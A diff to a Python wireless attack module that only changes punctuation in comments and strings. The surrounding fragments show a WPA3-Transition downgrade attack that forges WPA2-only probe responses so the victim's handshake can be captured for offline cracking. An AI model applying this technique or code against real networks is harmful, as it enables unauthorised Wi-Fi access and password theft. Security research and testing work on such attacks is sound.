@@ -4,7 +4,7 @@ Standard active downgrade attack against WPA3-Transition APs: forge probe
 responses carrying the AP's real BSSID + SSID + channel but with a WPA2-only
 RSN IE (SAE AKM stripped). When the targeted client receives our response
 before/instead of the real AP's, it may pick WPA2 for its next association
-attempt — done with the REAL AP, since the BSSID matches — and we passively
+attempt (done with the REAL AP, since the BSSID matches) and we passively
 capture the WPA2 4-way for offline cracking.
 
 Doable on a single card in monitor+inject. Does NOT work against pure WPA3 APs
@@ -72,7 +72,7 @@ class WPA3DowngradeAttack(Campaign):
         log_callback: Optional[Callable[[str], None]] = None,
     ):
         if not target.ssid:
-            raise ValueError("WPA3 Downgrade requires a known SSID — target is hidden.")
+            raise ValueError("WPA3 Downgrade requires a known SSID: target is hidden.")
         super().__init__(ap=target, iface=iface)
         self.target = target
         self._log = log_callback or (lambda _msg: None)
@@ -129,7 +129,7 @@ class WPA3DowngradeAttack(Campaign):
             ssid_len > 0 and frame_bytes[26:26 + ssid_len] == self._target_ssid_bytes
         )
         if not (is_wildcard or is_directed_for_us):
-            # Probe for some other SSID — not our race to run.
+            # Probe for some other SSID, not our race to run.
             return
 
         self.stats.probes_seen += 1
@@ -156,7 +156,7 @@ class WPA3DowngradeAttack(Campaign):
             self.stats.responses_sent += 1
         else:
             self.stats.responses_failed += 1
-        # Per-probe detail goes to the debug logger only — the UI surfaces live counts via a
+        # Per-probe detail goes to the debug logger only. The UI surfaces live counts via a
         # SECURITY-panel status line, not one event-log line per probe (which would flood it).
         logger.debug(
             "[WPA3-Down] %s probe from %s → forged WPA2-only resp (ok=%s)",
